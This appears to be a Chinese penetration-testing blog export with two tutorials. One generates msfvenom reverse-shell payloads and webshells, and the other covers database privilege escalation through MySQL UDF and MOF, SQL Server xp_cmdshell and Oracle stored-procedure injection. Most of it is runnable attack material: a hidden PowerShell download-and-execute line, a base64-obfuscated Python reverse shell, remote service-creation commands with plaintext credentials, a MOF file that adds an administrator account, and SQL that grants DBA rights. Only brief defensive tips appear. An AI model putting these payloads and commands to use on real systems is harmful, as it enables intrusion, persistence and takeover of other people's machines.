<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt;LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p>
<p>攻击机:kali  192.168.153.176</p>
<p>靶机: win7   192.168.153.160</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.176 LPORT=5555 -f exe -o payload.exe</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p>
<p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
<pre><code>msfconsole    //启动msf

use exploit/multi/handler          //使用msf的侦听模块exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload

set LHOST 192.168.153.176               //设置本地监听机Ip

set LPORT  4444              //设置监听端口

exploit </code></pre><p>执行完之后在Windows下执行payload.exe，然后结果如图：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p>
<p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
<ul>
<li>双击运行</li>
<li>cmd下运行exe</li>
<li>利用Powershell远程下载执行</li>
</ul>
<pre><code>powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http://127.0.0.1:8089&#39;,&#39;shell.exe&#39;);
start-process shell.exe</code></pre><ul>
<li>利用at或schtasks设置计划任务执行</li>
</ul>
<pre><code>net use \\192.168.17.138\c$ &quot;admin123&quot; /user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
sc \\192.168.17.138 create test binpath= &quot;c:\test.exe&quot;
sc \\192.168.17.138 start test
sc \\192.168.17.138 del test</code></pre><ul>
<li>利用wmic远程命令执行</li>
</ul>
<pre><code>wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create &quot;cmd.exe /c ipconfig&gt;d:\result.txt&quot;</code></pre><h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f asp <span class="token operator">></span> shell<span class="token punctuation">.</span>asp</code></pre>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>jsp</code></pre>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f war <span class="token operator">></span> shell<span class="token punctuation">.</span>war</code></pre>
<h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">88.128</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>php</code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p>
<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
<pre class=" language-java"><code class="language-java">msfconsole

use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 

set PAYLOAD php<span class="token operator">/</span>meterpreter_reverse_tcp 

set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span>

set LPORT  <span class="token number">4444</span> 

exploit</code></pre>
<p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<pre class=" language-java"><code class="language-java">php shell<span class="token punctuation">.</span>php</code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p>
<h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
<p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>sh</code></pre>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_perl LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>pl</code></pre>
<h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p>
<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre>
<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
<pre class=" language-java"><code class="language-java">msfconsole 

use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 

set PAYLOAD cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python 

set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> set LPORT  <span class="token number">4444</span> 

exploit </code></pre>
<p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
<pre class=" language-java"><code class="language-java">python <span class="token operator">-</span>c <span class="token string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p>
<p>结果如图：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p>
<p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p>
<p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>windows渗透测试中常见提权方式总结(二)</title>
    <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</url>
    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
<p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
<p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
<h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
<ul>
<li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p>
</li>
<li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p>
</li>
<li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p>
</li>
<li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p>
</li>
<li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p>
<p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
</li>
</ul>
<h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p>
<ul>
<li>MySQL 数据库没有开启安全模式。</li>
<li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li>
<li>shell 有写入到数据库安装目录的权限。</li>
</ul>
<p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p>
<ul>
<li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p>
<ul>
<li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li>
</ul>
<pre><code>secure_file_priv=&quot;&quot;</code></pre><pre><code> 将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li>
<li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p>
</li>
<li><p>mysql.user下password列更改为authentication_string列。</p>
</li>
</ul>
<h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p>
<p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p>
<p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p>
<p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p>
<p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p>
<p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p>
<p>还可以执行数据库命令：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p>
<p>这里补充一个点:</p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
<li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li>
</ul>
<p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
<p>用NTFS ADS流模式突破进而创建文件夹</p>
<pre><code>select @@basedir;  //查找到mysql的目录
select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建lib目录
select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建plugin目录</code></pre><p>我直接在菜刀下创建plugin文件夹</p>
<p>然后最关键的一步：<strong>导出UDF文件</strong></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
<p>导出后，再次尝试文件已经存在，说明导入成功。</p>
<p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
<p>引入sys_eval函数：</p>
<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;moonudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p>
<p>之后使用命令模板即可执行命令：</p>
<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>也可以直接使用大马这里的功能选项：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
<h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
<p>进入模块，看一下需要配置选项：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
<p>注：这里注意版本，适用于5.5.9以下，</p>
<h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
<pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
<h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
<p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
<p>文件内容：</p>
<pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
instance of __EventFilter as $EventFilter
{
EventNamespace = &quot;Root\\Cimv2&quot;;
Name = &quot;filtP2&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
&quot;And TargetInstance.Second = 5&quot;;
QueryLanguage = &quot;WQL&quot;;
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = &quot;consPCSV2&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText =
&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test test /add\&quot;)&quot;;
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};</code></pre><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p>
<p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
<pre><code>select load_file(&quot;C:/phpStudy/WWW/nullevt.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>可以使用菜刀下的数据库管理工具执行</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
<p>执行后，到win2003上查看用户：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
<p>之后我们可以将自定义的命令改为：</p>
<pre><code>net.exe localgroup administrators test /add</code></pre><p>即可对添加的用户进行提权。</p>
<h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
<h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
<p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
<h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
<ul>
<li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li>
<li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
<li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
</ul>
<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
<ul>
<li>getshell或者存在sql注入并且能够执行命令</li>
<li>sql server是system权限，sql server默认就是system权限。</li>
<li>获取SA用户口令</li>
</ul>
<h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul>
<li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li>
</ul>
<pre><code>conn.aspx
config.aspx
config.php
web.config
.........

一般格式如：

server=localhost;
UID=sa;
PWD=shadowflow</code></pre><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
<p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p>
<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</code></pre><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><pre><code>exec master..xp_cmdshell &#39;net user test pinohd123. /add&#39;    添加用户test，密码test
exec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添加test用户到管理员组</code></pre><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
<li>用户拥有<code>create procedure</code>权限（用来创建函数）</li>
</ul>
<h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p>
<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul>
<li>用户登陆后执行<code>select * from session_privs</code>查看权限</li>
<li>创建函数，命令为<code>grant dba to quan</code></li>
</ul>
<p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p>
<pre><code>SQL&gt;create or replace function pwn return vaarchar2
authid current_user is pragma autonomous_transaction;
begin
execute immediate &#39;grant dba to quan&#39;;
return &#39;&#39;;
end;
/

SQL&gt;grant execute on pwn to public;
/</code></pre><p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
<pre><code>SQL&gt;begin
sys.dbms_cdc_subscribe.activate_subscription(&#39;&#39;&#39;||quan.pwn()||&#39;&#39;&#39;);
end;
/

SQL&gt;set role dba;</code></pre><p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
<h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p>
